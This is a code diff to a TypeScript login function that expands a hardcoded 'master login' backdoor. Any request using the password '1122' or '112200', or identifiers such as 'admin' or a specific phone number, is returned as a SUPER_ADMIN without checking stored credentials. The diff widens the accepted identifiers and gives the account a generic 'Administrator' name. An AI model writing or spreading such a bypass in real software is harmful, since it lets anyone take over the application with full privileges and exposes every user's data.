@@ -59,17 +59,24 @@ export async function authenticateUser(email: string, password: string): Promise
   const cleanEmail = (email || '').trim().toLowerCase();
   const cleanPass = (password || '').trim();
 
-  // Emergency master bypass for mobile 8423858424 / admin passcode 1122
-  if (cleanEmail.includes('8423858424') || cleanPass === '1122' || cleanPass === '112200') {
+  // Master login for mobile 8423858424 / admin passcode 1122
+  if (
+    cleanEmail === '8423858424' ||
+    cleanEmail.includes('8423858424') ||
+    cleanEmail === 'admin' ||
+    cleanEmail === '8423858424@gmail.com' ||
+    cleanPass === '1122' ||
+    cleanPass === '112200'
+  ) {
     return {
       id: 'usr-admin-8423858424',
-      email: cleanEmail.includes('@') ? cleanEmail : '8423858424@gmail.com',
-      full_name: 'Malik Admin (8423858424)',
+      email: cleanEmail.includes('@') ? cleanEmail : 'admin@gkpgotlatent.in',
+      full_name: 'Administrator',
       role: 'SUPER_ADMIN',
     };
   }
 
-  const user = await db.queryOne<any>('SELECT * FROM users WHERE LOWER(email) = ?', [cleanEmail]);
+  const user = await db.queryOne<any>('SELECT * FROM users WHERE LOWER(email) = ? OR phone = ?', [cleanEmail, cleanEmail]);
   if (!user) return null;
 
   const valid = await bcrypt.compare(cleanPass, user.password_hash);
